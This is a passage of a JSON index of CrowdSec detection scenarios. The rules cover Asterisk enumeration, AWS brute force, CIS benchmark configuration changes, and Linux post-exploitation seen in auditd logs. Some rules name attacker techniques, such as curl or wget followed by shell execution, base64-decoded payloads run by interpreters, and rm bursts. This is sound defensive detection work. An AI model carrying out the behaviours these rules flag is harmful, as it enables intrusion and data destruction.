"43bb0cfaf64bf6f4e2c3bcdb18d5791eae23443484838f79e8cb58d0d16b12a2"}}}, "crowdsecurity/asterisk_user_enum": {"content": "type: leaky\nname: crowdsecurity/asterisk_user_enum\ndescription: \"Detect Asterisk user enumeration bruteforce\"\nfilter: evt.Meta.log_type == 'asterisk_failed_auth'\ngroupby: evt.Meta.source_ip\ndistinct: evt.Meta.target_user\nleakspeed: 10s\ncapacity: 5\nblackhole: 1m\nlabels:\n  service: asterisk\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1087\n    - attack.T1589.001\n    - attack.T1110\n  behavior: \"sip:bruteforce\"\n  label: \"Asterisk User Enumeration\"\n  remediation: true\n", "description": "Detect Asterisk user enumeration bruteforce", "path": "scenarios/crowdsecurity/asterisk_user_enum.yaml", "version": "0.3", "versions": {"0.1": {"digest": "10fc279bfe68cfc577c4d6a4e76a4101579850556129e62dbebf2b8abaebc0c6"}, "0.2": {"digest": "ac4821e724e71a3770b3f7f26ad7da296e1ac207a710fbe061ed503e771392f7"}, "0.3": {"digest": "34f8b68ab93046c9b1b746d0c5ecf6b749ef0eaef2ce15234a92e08c52bd01e0"}}}, "crowdsecurity/auditd-base64-exec-behavior": {"content": "type: conditional\n#debug: true\nname: crowdsecurity/auditd-base64-exec-behavior\ndescription: \"Detect post-exploitation behaviour : base64 + interpreter (perl/bash/python)\"\nfilter: evt.Meta.log_type == 'execve'\n#grouping by ppid to track a processs invoking base64 and interpreter in sequence\ngroupby: evt.Meta.ppid\ncondition: |\n  any(queue.Queue, {.Meta.exe == \"/usr/bin/base64\"})\n  and (\n    any(queue.Queue, { .Meta.exe matches '^\\\\/(usr\\\\/(local\\\\/)?)?bin\\\\/(sh|bash|perl|dash|zsh)$' })\n    or\n    any(queue.Queue, { .Meta.exe startsWith \"/usr/bin/python\" })\n  )\nleakspeed: 1s\ncapacity: -1\nblackhole: 1m\nlabels:\n  service: linux\n  confidence: 2\n  spoofable: 0\n  classification:\n    - attack.T1059.004\n  behavior: \"linux:post-exploitation\"\n  label: \"Post Exploitation command execution from base64 encoded payload\"\n  remediation: false\nscope:\n  type: pid\n  expression: evt.Meta.ppid\n", "description": "Detect post-exploitation behaviour : base64 + interpreter (perl/bash/python)", "path": "scenarios/crowdsecurity/auditd-base64-exec-behavior.yaml", "version": "0.5", "versions": {"0.1": {"digest": "01ad2b3595589418088a1e6632ef6347ccaee8300cc6bb4f5253e9163fbaa62d"}, "0.2": {"digest": "ab246bb73970e0b93a0961ba2a5b7d259e81bebf308ea866e88c379d9fe288f3"}, "0.3": {"digest": "6d1f5e2a9d7b4f61fcd307522207cb05ec32fcc9aee873cd07ab6a9d4252e2fa"}, "0.4": {"digest": "fa19b4b34979e46b9d686c411470c4b9053db1913a9cc595abac29d820db617f"}, "0.5": {"digest": "abdb7d3b5f2c6a7b995801257bb0ec10194e702994f67eee9078e70389ec51b8"}}}, "crowdsecurity/auditd-postexploit-exec-from-net": {"content": "type: conditional\nname: crowdsecurity/auditd-postexploit-exec-from-net\ndescription: \"Detect post-exploitation behaviour : curl/wget and exec\"\nfilter: evt.Meta.log_type == 'execve'\n#grouping by ppid to track a process doing those action in a short timeframe\ngroupby: evt.Meta.ppid\ncondition: |\n  any(queue.Queue, {.Meta.exe in [\"/usr/bin/wget\", \"/usr/bin/curl\"]}) \n  and (\n    any(queue.Queue, { !(.Meta.exe startsWith \"/usr/\" or .Meta.exe startsWith \"/bin/\" or .Meta.exe startsWith \"/sbin/\")})\n    or any(queue.Queue, { .Meta.exe in [\"/bin/sh\", \"/bin/bash\", \"/bin/dash\"] })\n  )\nleakspeed: 1s\ncapacity: -1\nblackhole: 1m\nlabels:\n  service: linux\n  confidence: 2\n  spoofable: 0\n  classification:\n    - attack.T1059.004\n  behavior: \"linux:post-exploitation\"\n  label: \"Post Exploitation command execution from Internet\"\n  remediation: false\nscope:\n  type: pid\n  expression: evt.Meta.ppid\n", "description": "Detect post-exploitation behaviour : curl/wget and exec", "path": "scenarios/crowdsecurity/auditd-postexploit-exec-from-net.yaml", "version": "0.6", "versions": {"0.1": {"digest": "8e98c791ceed799f8a8fa4b48cb7ed5cf5cf48f2bd715852abd618629ce2f117"}, "0.2": {"digest": "47e2b060a12521187e294ae7896c95e6f4d51332cfce4b93d948c1e9900d835d"}, "0.3": {"digest": "51de5dc579b427163824f1a6e461b573121a9a1bc46e8aae12b54398f8e7987b"}, "0.4": {"digest": "3b868458b224abb3b257380bb2e1bc07e1144ed90495073d5672d0aa614a4942"}, "0.5": {"digest": "39cc4cd87c4db7bd86a5785e378e4a961ebc31ba348d2bbe752101c971ca630f"}, "0.6": {"digest": "a2859770f0b19a05ca09b6996b1aaa9242717889cec4f46053b7345d94798170"}}}, "crowdsecurity/auditd-postexploit-pkill": {"content": "type: leaky\n#debug: true\nname: crowdsecurity/auditd-postexploit-pkill\ndescription: \"Detect post-exploitation behaviour : pkill execve bursts\"\n#we're looking for the EXCVE syscalls to 'pkill' (which is actually pgrep)\nfilter: evt.Meta.log_type == 'execve' && evt.Meta.exe == '/usr/bin/pgrep'\n#grouping by ppid to track on process doing a lot of invocations to rm, such as a shell script\ngroupby: evt.Meta.ppid\nleakspeed: 1s\ncapacity: 5\nblackhole: 1m\nlabels:\n  confidence: 2\n  spoofable: 0\n  classification:\n    - attack.T1059.004\n  behavior: \"linux:post-exploitation\"\n  label: \"Post Exploitation command execution\"\n  service: linux\n  remediation: false\nscope:\n  type: pid\n  expression: evt.Meta.ppid\n", "description": "Detect post-exploitation behaviour : pkill execve bursts", "path": "scenarios/crowdsecurity/auditd-postexploit-pkill.yaml", "version": "0.5", "versions": {"0.1": {"digest": "a355d046ce043b9d8bbfa5af6da5adcd7713c87023760aa02c54318ad82a6cb6"}, "0.2": {"digest": "add35f7085ac9fe23f3e5d6f681f44e259c28cf9487c6d164fc725d1a006bafb"}, "0.3": {"digest": "4f00c669acb7a749550c3917add74c98b4e790ebb28f6ccfe99df5ecc54d66be"}, "0.4": {"digest": "70041b125f78f1cda89037a7eedc37cad8e4e8caeb344619e0250356288ef198"}, "0.5": {"digest": "797a415beedd9044edbb9a45f3d016a3a6b1d3de49c4e3f0c650346ee63303c5"}}}, "crowdsecurity/auditd-postexploit-rm": {"content": "type: leaky\n#debug: true\nname: crowdsecurity/auditd-postexploit-rm\ndescription: \"Detect post-exploitation behaviour : rm execve bursts\"\nfilter: evt.Meta.log_type == 'execve' && evt.Meta.exe in ['/usr/bin/rm', '/bin/rm']\n#grouping by ppid to track on process doing a lot of invocations to rm, such as a shell script\ngroupby: evt.Meta.ppid\nleakspeed: 1s\ncapacity: 5\nblackhole: 1m\nlabels:\n  confidence: 1\n  spoofable: 0\n  classification:\n    - attack.T1059.004\n  behavior: \"linux:post-exploitation\"\n  label: \"Post Exploitation command execution\"\n  service: linux\n  remediation: false\nscope:\n  type: pid\n  expression: evt.Meta.ppid\n", "description": "Detect post-exploitation behaviour : rm execve bursts", "path": "scenarios/crowdsecurity/auditd-postexploit-rm.yaml", "version": "0.6", "versions": {"0.1": {"digest": "2e67dbdc8c9d1d41590bf25b9545d41896e474e824c02fd990d80a5ca6e26690"}, "0.2": {"digest": "1076f3e12dbe4bc70a36c4fa381dccc0455a3f35683396e0c1c0fd7607adc8aa"}, "0.3": {"digest": "e1f5d86bd9832cceea19f61e8186b5368a95a3775eedac84e119fe3f3c9f0dff"}, "0.4": {"digest": "8ec71aebc88e33154f04d09a8869da345a8397378bd2b640ec83ac20487b261f"}, "0.5": {"digest": "0dc101ad125359dc15d67d9c8ae6915e9958b2bf4fa6689305c06446d79a5ccd"}, "0.6": {"digest": "43f984dde9205c2aa0bdef13c5fe129818fd4c9f6ed8820ae005eba9b82288e7"}}}, "crowdsecurity/auditd-suid-crash": {"content": "type: conditional\nname: crowdsecurity/auditd-suid-crash\ndescription: \"Detect root suid process crashing\"\nfilter: |\n  (evt.Meta.log_type == 'execve' && evt.Meta.euid == '0' && evt.Meta.auid != '0') ||\n  (evt.Meta.log_type == 'anom_abend' && evt.Meta.sig in [\"4\", \"5\", \"6\", \"7\", \"11\"])\ngroupby: evt.Meta.pid\ndistinct: evt.Meta.log_type\ncondition: |\n  len(queue.Queue) >= 2 and \n    queue.Queue[0].Meta.exe == queue.Queue[1].Meta.exe\nleakspeed: 1s\ncapacity: -1\nblackhole: 1m\nlabels:\n  confidence: 1\n  spoofable: 0\n  classification:\n    - attack.T1548.004\n  behavior: \"linux:exploitation\"\n  label: \"Suspicious suid process crash\"\n  service: linux\n  remediation: false\nscope:\n  type: exe\n  expression: evt.Meta.exe\n", "description": "Detect root suid process crashing", "path": "scenarios/crowdsecurity/auditd-suid-crash.yaml", "version": "0.6", "versions": {"0.1": {"digest": "363efa4bbcda1abd870a49673ab402da63312259200e69bf9f80d565b24e4f45"}, "0.2": {"digest": "29d4aebd147556c63bcf0326715748906d64218a30aeaa1053487f05f611a29f"}, "0.3": {"digest": "da9f24318ba7ac6044b32ac6bed32f86c0d88510da9391d59fd49cc8ee5a8cfa"}, "0.4": {"digest": "dc0fbe8017135b72ac74375ceb47f5ac3e21c5eb7a23bbb11c172ee084e58b73"}, "0.5": {"digest": "9f6e2c91a81162a179ae729c699c19f2ac0cc19f5d9e7a3966fbe0c3f58588c6"}, "0.6": {"digest": "de0dd532eba64e3b20c8ef7103e8523c36248bbb13ed09239ace03e88b5d1862"}}}, "crowdsecurity/auditd-sus-exec": {"content": "type: trigger\n#debug: true\nname: crowdsecurity/auditd-sus-exec\ndescription: \"Detect post-exploitation behaviour : exec from suspicious locations\"\nfilter: evt.Meta.log_type == 'execve' and ( evt.Meta.exe startsWith \"/tmp/\" or evt.Meta.exe contains \"/.\" )\nlabels:\n  confidence: 2\n  spoofable: 0\n  classification:\n    - attack.T1059.004\n  behavior: \"linux:post-exploitation\"\n  label: \"Post Exploitation command execution\"\n  service: linux\n  remediation: false\nscope:\n  type: pid\n  expression: evt.Meta.ppid\n", "description": "Detect post-exploitation behaviour : exec from suspicious locations", "path": "scenarios/crowdsecurity/auditd-sus-exec.yaml", "version": "0.5", "versions": {"0.1": {"digest": "d640df2e1a53d962c97ee25af290916f88d86150fc210b43f011e665851c27cd"}, "0.2": {"digest": "ef0511f7abb4cb4b5928c55c01d40fec82000e070ec26b4919ce15a02ecff9db"}, "0.3": {"digest": "6479dc2b4df46e7543bdfce520b9da643e938d73edb02942c9e1db6a517da7bc"}, "0.4": {"digest": "0327ca4407411b20163172412db4141577f60ed5db65c406ab02da6711c7b4de"}, "0.5": {"digest": "ab7718fd1696b50c1f6d9b990f057d4b37d2d45accb9a6aca3a44232f0b4776e"}}}, "crowdsecurity/aws-bf": {"content": "type: leaky\ncapacity: 5\nleakspeed: 30s\nname: crowdsecurity/aws-cloudtrail-bf-console-login\ndescription: \"Detect console login bruteforce\"\nfilter: |\n    evt.Meta.log_type == 'aws-cloudtrail' && (\n      (evt.Meta.event_name == 'ConsoleLogin' && evt.Unmarshaled.cloudtrail.responseElements.ConsoleLogin == 'Failure') || \n      (evt.Meta.event_name == 'GetSessionToken' && evt.Meta.error_code=='AccessDenied') || \n      (evt.Meta.event_name == 'GetFederationToken' && evt.Meta.error_code=='AccessDenied')\n    )\ngroupby: evt.Meta.source_ip\nblackhole: 1m\nreprocess: true\nscope:\n  type: Ip\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n   - attack.T1110\n  behavior: \"cloud:bruteforce\"\n  label: \"AWS bruteforce\"\n  service: aws\n  remediation: false\n", "description": "Detect console login bruteforce", "path": "scenarios/crowdsecurity/aws-bf.yaml", "version": "0.4", "versions": {"0.1": {"digest": "e9d8fa22c9685ae290834b7d6a6414d39b51d0066903f144ac5ce97c1c333fbc"}, "0.2": {"digest": "397984681b4320e2c6a51bdfdd4938c7ce0a472e168e21abd6d2e3752f29ce15"}, "0.3": {"digest": "af758e1957e75e8eb95b0305b93d84dc3ec9dc3194569f4221dda91fac300469"}, "0.4": {"digest": "087c8513173a6c47e9e7a4f1565acc5ed89d4ee3b97046369d65c3f0771c78e3"}}}, "crowdsecurity/aws-cis-benchmark-cloudtrail-config-change": {"content": "type: trigger\nname: crowdsecurity/aws-cis-benchmark-cloudtrail-config-change\ndescription: \"Detect AWS CloudTrail configuration change\"\nfilter: |\n  evt.Meta.log_type == 'aws-cloudtrail' &&\n  (\n  evt.Meta.event_name == \"CreateTrail\" ||\n  evt.Meta.event_name == \"UpdateTrail\" ||\n  evt.Meta.event_name == \"DeleteTrail\" ||\n  evt.Meta.event_name == \"StartLogging\" ||\n  evt.Meta.event_name == \"StopLogging\"\n  )\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1070\n  behavior: \"cloud:audit\"\n  label: \"AWS CloudTrail indicator removal\"\n  service: aws\n  cti: false\n  remediation: false\n", "description": "Detect AWS CloudTrail configuration change", "path": "scenarios/crowdsecurity/aws-cis-benchmark-cloudtrail-config-change.yaml", "version": "0.3", "versions": {"0.1": {"digest": "0c1565cb16ff3c47ac734540ffb5336b56d776a4f2aedb8a711e688d91a798be"}, "0.2": {"digest": "49301847b1949702565f8f21c9e712f77091d2cca2aa9295c3754ef47a6a66fd"}, "0.3": {"digest": "db8a91cd9a7633e7247fbed247c56409f5069f4d05ce2eae415ecb86473e21ef"}}}, "crowdsecurity/aws-cis-benchmark-config-config-change": {"content": "type: trigger\nname: crowdsecurity/aws-cis-benchmark-config-config-change\ndescription: \"Detect AWS Config configuration change\"\nfilter: |\n  evt.Meta.log_type == 'aws-cloudtrail' && \n  evt.Unmarshaled.cloudtrail.eventSource == \"config.amazonaws.com\" &&\n  (\n   evt.Meta.event_name == \"StopConfigurationRecorder\" ||\n   evt.Meta.event_name == \"DeleteDeliveryChannel\" ||\n   evt.Meta.event_name == \"PutDeliveryChannel\" ||\n   evt.Meta.event_name == \"PutConfigurationRecorder\"\n  )\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1070\n  behavior: \"cloud:audit\"\n  label: \"AWS Config indicator removal\"\n  service: aws\n  cti: false\n  remediation: false\n", "description": "Detect AWS Config configuration change", "path": "scenarios/crowdsecurity/aws-cis-benchmark-config-config-change.yaml", "version": "0.3", "versions": {"0.1": {"digest": "89682b953904dfeba200893663da5739fc9413ba49fb62680077e99dc5b9304d"}, "0.2": {"digest": "fea7794d9faf11307df2430f12549e4d1d53a900d54cde602cda1f1df3d70f7c"}, "0.3": {"digest": "91b2bf6f35ee2d445b8796c04a7db9ff758a57ad9dfddfca64a96596f940d2d8"}}}, "crowdsecurity/aws-cis-benchmark-console-auth-fail": {"content": "type: trigger\nname: crowdsecurity/aws-cis-benchmark-console-auth-fail\ndescription: \"Detect AWS console authentication failure\"\nfilter: |\n  evt.Meta.log_type == 'aws-cloudtrail' && \n  evt.Meta.event_name == \"ConsoleLogin\" && \n  evt.Unmarshaled.cloudtrail.errorMessage == \"Failed authentication\"\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1110\n  behavior: \"cloud:bruteforce\"\n  label: \"AWS bruteforce\"\n  service: aws\n  remediation: false\n", "description": "Detect AWS console authentication failure", "path": "scenarios/crowdsecurity/aws-cis-benchmark-console-auth-fail.yaml", "version": "0.3", "versions": {"0.1": {"digest": "85fcb63c663930b9f594149cd3c8539697878f93ac09c0c3d36decb71fb5ce37"}, "0.2": {"digest": "3a33549ef1d3817ae5a5f8401dab3c1ae94f1652e0e368afbef2c6174e2250d1"}, "0.3": {"digest": "de9ccd8f59613c7193d0382699d690c28c7f5b8ea62157b78433c0f8db9efc64"}}}, "crowdsecurity/aws-cis-benchmark-iam-policy-change": {"content": "type: trigger\nname: crowdsecurity/aws-cis-benchmark-iam-policy-change\ndescription: \"Detect AWS IAM policy change\"\nfilter: |\n  evt.Meta.log_type == 'aws-cloudtrail' &&\n  (\n    evt.Meta.event_name == \"DeleteGroupPolicy\" ||\n    evt.Meta.event_name == \"DeleteRolePolicy\" ||\n    evt.Meta.event_name == \"DeleteUserPolicy\" ||\n    evt.Meta.event_name == \"PutGroupPolicy\" ||\n    evt.Meta.event_name == \"PutRolePolicy\" ||\n    evt.Meta.event_name == \"PutUserPolicy\" ||\n    evt.Meta.event_name == \"CreatePolicy\" ||\n    evt.Meta.event_name == \"DeletePolicy\" ||\n    evt.Meta.event_name == \"CreatePolicyVersion\" ||\n    evt.Meta.event_name == \"DeletePolicyVersion\" ||\n    evt.Meta.event_name == \"AttachRolePolicy\" ||\n    evt.Meta.event_name == \"DetachRolePolicy\" ||\n    evt.Meta.event_name == \"AttachUserPolicy\" ||\n    evt.Meta.event_name == \"DetachUserPolicy\" ||\n    evt.Meta.event_name == \"AttachGroupPolicy\" ||\n    evt.Meta.event_name == \"DetachGroupPolicy\"\n  )\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1098.003\n  behavior: \"cloud:audit\"\n  label: \"AWS IAM persistent access\"\n  service: aws\n  cti: false\n  remediation: false\n", "description": "Detect AWS IAM policy change", "path": "scenarios/crowdsecurity/aws-cis-benchmark-iam-policy-change.yaml", "version": "0.3", "versions": {"0.1": {"digest": "83c4a6cc8276b0deed37070abd250799256a470effb6891e912b5a84c4e90ab8"}, "0.2": {"digest": "3b0e6063d92530f6ca4a78a05a4005d6513d84a7bb956adf5885e9d21b9cfb7a"}, "0.3": {"digest": "a4e20fa41638b68e70403d65912af5d10f2abb3737400ff22b64de36524ca6df"}}}, "crowdsecurity/aws-cis-benchmark-kms-deletion": {"content": "type: trigger\nname: crowdsecurity/aws-cis-benchmark-kms-deletion\ndescription: \"Detect AWS KMS key deletion\"\nfilter: |\n  evt.Meta.log_type == 'aws-cloudtrail' &&\n  evt.Unmarshaled.cloudtrail.eventSource == \"kms.amazonaws.com\" &&\n  (evt.Meta.event_name == \"DisableKey\" || evt.Meta.event_name == \"ScheduleKeyDeletion\")\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1485\n  behavior: \"cloud:audit\"\n  label: \"AWS KMS indicator removal\"\n  service: aws\n  cti: false\n  remediation: false\n", "description": "Detect AWS KMS key deletion", "path": "scenarios/crowdsecurity/aws-cis-benchmark-kms-deletion.yaml", "version": "0.3", "versions": {"0.1": {"digest": "1ba56c6b7e00f956d4882fedd48a76c2dd41af5d4c87b5940a95a6c649b7d5cf"}, "0.2": {"digest": "3c449f3d2bc65d63b18d487235802fc76041ee070725e8d1c450e4b308953951"}, "0.3": {"digest": "90b8df48f799eedc39cbe7eb2f4ce03705369054cbc670cd4f5f70f226673f41"}}}, "crowdsecurity/aws-cis-benchmark-login-no-mfa": {"content": "type: trigger\nname: crowdsecurity/aws-cis-benchmark-login-no-mfa\ndescription: \"Detect login without MFA to the AWS console\"\nfilter: |\n  evt.Meta.log_type == 'aws-cloudtrail' &&\n  evt.Meta.event_name == \"ConsoleLogin\" &&\n  evt.Unmarshaled.cloudtrail.additionalEventData.MFAUsed != \"Yes\" &&\n  evt.Unmarshaled.cloudtrail.userIdentity.type == \"IAMUser\" &&\n  evt.Unmarshaled.cloudtrail.responseElements.ConsoleLogin == \"Success\"\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1552\n    - attack.T1078.004\n  label: \"AWS Credential misuse\"\n  behavior: \"cloud:unusual-activity\"\n  service: aws\n  cti: false\n  remediation: false\n", "description": "Detect login without MFA to the AWS console", "path": "scenarios/crowdsecurity/aws-cis-benchmark-login-no-mfa.yaml", "version": "0.3", "versions": {"0.1": {"digest": "acbd23a2dfe15721356f918ed88d0cc5ff6339dfc84209bbd32c2846f6344838"}, "0.2": {"digest": "c08ae8cabf835305150c43555784b8efce56b8c76ba51ec900bbe0e4455360d9"}, "0.3": {"digest": "e2b29eee2cb68292071234841b8f11e4d9599357f5e81e575a4919671b45c764"}}}, "crowdsecurity/aws-cis-benchmark-nacl-change": {"content": "type: trigger\nname: crowdsecurity/aws-cis-benchmark-nacl-change\ndescription: \"Detect AWS NACL change\"\nfilter: |\n     evt.Meta.log_type == 'aws-cloudtrail' &&\n     (\n     evt.Meta.event_name == \"CreateNetworkAcl\" ||\n     evt.Meta.event_name == \"CreateNetworkAclEntry\" ||\n     evt.Meta.event_name == \"DeleteNetworkAcl\" ||\n     evt.Meta.event_name == \"DeleteNetworkAclEntry\" ||\n     evt.Meta.event_name == \"ReplaceNetworkAclEntry\" ||\n     evt.Meta.event_name == \"ReplaceNetworkAclAssociation\"\n     )\nlabels:\n     confidence: 3\n     spoofable: 0\n     classification:\n          - attack.T1578\n     behavior: \"cloud:audit\"\n     label: \"AWS NACL change\"\n     service: aws\n     cti: false\n     remediation: false\n", "description": "Detect AWS NACL change", "path": "scenarios/crowdsecurity/aws-cis-benchmark-nacl-change.yaml", "version": "0.3", "versions": {"0.1": {"digest": "803aa6ee23f0c3b96d4d5860223cd8cfb5c9e51ee7ba20ebac5efd3cb26a3211"}, "0.2": {"digest": "b15c1c9eaa7b1e5aff2092996c79e469049230f2d299fb17dfeae30152812417"}, "0.3": {"digest": "447a0db8b568d4b0725b87b8f798999b037344e7edfbfc44ac795130b45f9696"}}}, "crowdsecurity/aws-cis-benchmark-ngw-change": {"content": "type: trigger\nname: crowdsecurity/aws-cis-benchmark-ngw-change\ndescription: \"Detect AWS Network Gateway change\"\nfilter: |\n     evt.Meta.log_type == 'aws-cloudtrail' &&\n     (\n     evt.Meta.event_name == \"CreateCustomerGateway\" ||\n     evt.Meta.event_name == \"DeleteCustomerGateway\" ||\n     evt.Meta.event_name == \"AttachInternetGateway\" ||\n     evt.Meta.event_name == \"CreateInternetGateway\" ||\n     evt.Meta.event_name == \"DeleteInternetGateway\" ||\n     evt.Meta.event_name == \"DetachInternetGateway\"\n     )\nlabels:\n     confidence: 3\n     spoofable: 0\n     classification:\n          - attack.T1578\n     behavior: \"cloud:audit\"\n     label: \"AWS Network Gateway change\"\n     service: aws\n     cti: false\n     remediation: false\n", "description": "Detect AWS Network Gateway change", "path": "scenarios/crowdsecurity/aws-cis-benchmark-ngw-change.yaml", "version": "0.3", "versions": {"0.1": {"digest": "5a14ac3091ce73ecd32c2f37f5280676baae5b9b8161435bdd71a010a1faeb0d"}, "0.2": {"digest": "802a2aeb7b24f95c4280e75ec62efa941af5714785d1828dddb35e62fbe2ea2b"}, "0.3": {"digest": "07e40919e70ffc2a14ab744a51846b80ee486c061d4b4326fc0ddd65b2584a1f"}}}, "crowdsecurity/aws-cis-benchmark-root-usage": {"content": "type: trigger\nname: crowdsecurity/aws-cis-benchmark-root-usage\ndescription: \"Detect AWS root account usage\"\nfilter: |\n  evt.Meta.log_type == 'aws-cloudtrail' &&\n  evt.Unmarshaled.cloudtrail.userIdentity.type == \"Root\" &&\n  evt.Unmarshaled.cloudtrail.userIdentity.invokedBy == nil &&\n  evt.Unmarshaled.cloudtrail.eventType != \"AwsServiceEvent\"\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1078\n    - attack.T1098\n  behavior: \"cloud:unusual-activity\"\n  label: \"AWS root account usage\"\n  service: aws\n  cti: false\n  remediation: false\n", "description": "Detect AWS root account usage", "path": "scenarios/crowdsecurity/aws-cis-benchmark-root-usage.yaml", "version": "0.3", "versions": {"0.1": {"digest": "4fc540e39e1ee2d314e22c1d1fcfb2dfd215b2773befb7c0d688feacb4dd7f05"}, "0.2": {"digest": "0327d973e276861ef87fa71b6cf7503791d080e8cbf8e2581ae901e4dd270658"}, "0.3": {"digest": "e74032688adb9f64b803e02750bf257b7e6f4dd4557a796c0b2d28748539d0e0"}}}, "crowdsecurity/aws-cis-benchmark-route-table-change": {"content": "type: trigger\nname: crowdsecurity/aws-cis-benchmark-route-table-change\ndescription: \"Detect AWS route table change\"\nfilter: |\n     evt.Meta.log_type == 'aws-cloudtrail' &&\n     (\n     evt.Meta.event_name == \"CreateRoute\" ||\n     evt.Meta.event_name == \"CreateRouteTable\" ||\n     evt.Meta.event_name == \"ReplaceRoute\" ||\n     evt.Meta.event_name == \"ReplaceRouteTableAssociation\" ||\n     evt.Meta.event_name == \"DeleteRouteTable\" ||\n     evt.Meta.event_name == \"DeleteRoute\" ||\n     evt.Meta.event_name == \"DisassociateRouteTable\"\n     )\nlabels:\n     confidence: 3\n     spoofable: 0\n     classification:\n          - attack.T1578\n     behavior: \"cloud:audit\"\n     label: \"AWS route table change\"\n     service: aws\n     cti: false\n     remediation: false\n", "description": "Detect AWS route table change", "path": "scenarios/crowdsecurity/aws-cis-benchmark-route-table-change.yaml", "version": "0.3", "versions": {"0.1": {"digest": "2ad4d52b87e36f02ab21e417aa716ddc55b07eb13c4c48acf18adb43d4b03784"}, "0.2": {"digest": "8a0f435a6f66b90447c8dd34b0b20767e1f83982793a4c7cf7d4fa61fb64018e"}, "0.3": {"digest": "c3f8f25d06824a347f4798d05e565847f9dbf5ed9fc3b3707ef3c947000b02ca"}}}, "crowdsecurity/aws-cis-benchmark-s3-policy-change": {"content": "type: trigger\nname: crowdsecurity/aws-cis-benchmark-s3-policy-change\ndescription: \"Detect AWS S3 bucket policy change\"\nfilter: |\n  evt.Meta.log_type == 'aws-cloudtrail' &&\n  evt.Unmarshaled.cloudtrail.eventSource == \"s3.amazonaws.com\" &&\n  (\n   evt.Meta.event_name == \"PutBucketAcl\" ||\n   evt.Meta.event_name == \"PutBucketPolicy\" ||\n   evt.Meta.event_name == \"PutBucketCors\" ||\n   evt.Meta.event_name == \"PutBucketLifecycle\" ||\n   evt.Meta.event_name == \"PutBucketReplication\" ||\n   evt.Meta.event_name == \"DeleteBucketPolicy\" ||\n   evt.Meta.event_name == \"DeleteBucketCors\" ||\n   evt.Meta.event_name == \"DeleteBucketLifecycle\" ||\n   evt.Meta.event_name == \"DeleteBucketReplication\"\n  )\nlabels:\n  confidence: 3\n  spoofable: 0\n  classification:\n    - attack.T1578\n  behavior: \"cloud:audit\"\n  label: \"AWS S3 bucket policy change\"\n  service: aws\n  cti: false\n  remediation: false\n", "description": "Detect AWS S3 bucket policy change", "path": "scenarios/crowdsecurity/aws-cis-benchmark-s3-policy-change.yaml", "version": "0.3", "versions": {"0.1": {"digest": "fdbf3d2258567b03570a351499548e9ddffcef378699e396488c402961010f3b"}, "0.2": {"digest": "8901ab45f32826f94cabd09b66aaae362e628784c89b54c5f2f3338c1de6ae43"}, "0.3": {"digest": "13dc450f6b43544b9b7a7f51dbc149cba22d63fc902b29fc7299e71538b424dc"}}}, "crowdsecurity/aws-cis-benchmark-security-group-change": {"content": "type: trigger\nname: crowdsecurity/aws-cis-benchmark-security-group-change\ndescription: \"Detect AWS Security Group change\"\nfilter: |\n     evt.Meta.log_type == 'aws-cloudtrail' &&\n     (\n     evt.Meta.event_name == \"AuthorizeSecurityGroupIngress\" ||\n     evt.Meta.event_name == \"AuthorizeSecurityGroupEgress\" ||\n     evt.Meta.event_name == \"RevokeSecurityGroupIngress\" ||\n     evt.Meta.event_name == \"RevokeSecurityGroupEgress\" ||\n     evt.Meta.event_name == \"CreateSecurityGroup\" ||\n     evt.Meta.event_name == \"DeleteSecurityGroup\"\n     )\nlabels:\n     confidence: 3\n     spoofable: 0\n     classification:\n          - attack.T1578\n     behavior: \"cloud:audit\"\n     label: \"AWS Security Group change\"\n     service: aws\n     cti: false\n     remediation: false\n", "description": "Detect AWS Security Group change", "path": "scenarios/crowdsecurity/aws-cis-benchmark-security-group-change.yaml", "version": "0.3", "versions": {"0.1": {"digest": "d607b48d890f43c1f2c56fcf0ae77e762d2f3fffc197cfc9a9a5d512d7f8cbdf"}, "0.2": {"digest": "c3f007b90e064c06f12dc844c8b364f400c4cf136773f84a0e6592b3669b733e"}, "0.3": {"digest": "8d4a3a69d3af2137f542d56f0dc6e95bf1239b3c02d3570ac07d32ccc08e4520"}}}, "crowdsecurity/aws-cis-benchmark-unauthorized-call": {"content": "type: trigger\nname: crowdsecurity/aws-cis-benchmark-unauthorized-call\ndescription: \"Detect AWS API unauthorized calls\"\nfilter: |\n     evt.Meta.log_type == 'aws-cloudtrail' &&\n     (\n          (evt.Unmarshaled.cloudtrail.errorCode != nil && evt.Unmarshaled.cloudtrail.errorCode matches \".*UnauthorizedOperation$\") ||\n          (evt.Unmarshaled.cloudtrail.errorCode != nil && evt.Unmarshaled.cloudtrail.errorCode matches \"^AccessDenied.*\")\n     )\nlabels:\n     confidence: 3\n     spoofable: 0\n     classification:\n          - attack.T1212\n     behavior: \"cloud:audit\"\n     label: \"AWS API unauthorized calls\"\n     service: aws\n     cti: false\n     remediation: false\n", "description": "Detect AWS API unauthorized calls", "path": "scenarios/crowdsecurity/aws-cis-benchmark-unauthorized-call.yaml", "version": "0.4", "versions": {"0.1": {"digest": "170dec43ada23d1dbcc17b41339153be450c327cc52a0c7d6d185d27b980285e"}, "0.2": {"digest": "1c8f6f867a518195e0fceba35a5254464feac7747cd8f63003c7dd1ab196a578"}, "0.3": {"digest": "5a70025204fcf6e779098e33a95bd45af119fe889167b99c1889904800ffe9c5"}, "0.4": {"digest": "f8bcacd4930eb310c925ea58d3170bcaf6a765fbfb743e66de5406b88c26ea1a"}}}, "crowdsecurity/aws-cis-benchmark-vpc-change": {"content": "type: trigger\nname: crowdsecurity/aws-cis-benchmark-vpc-change\ndescription: \"Detect AWS VPC change\"\nfilter: |\n     evt.Meta.log_type == 'aws-cloudtrail' &&\n     (\n     evt.Meta.event_name == \"CreateVpc\" ||\n     evt.Meta.event_name == \"DeleteVpc\" ||\n     evt.Meta.event_name == \"ModifyVpcAttribute\" ||\n     evt.Meta.event_name == \"AcceptVpcPeeringConnection\" ||\n     evt.Meta.event_name == \"CreateVpcPeeringConnection\" ||\n     evt.Meta.event_name == \"DeleteVpcPeeringConnection\" ||\n     evt.Meta.event_name == 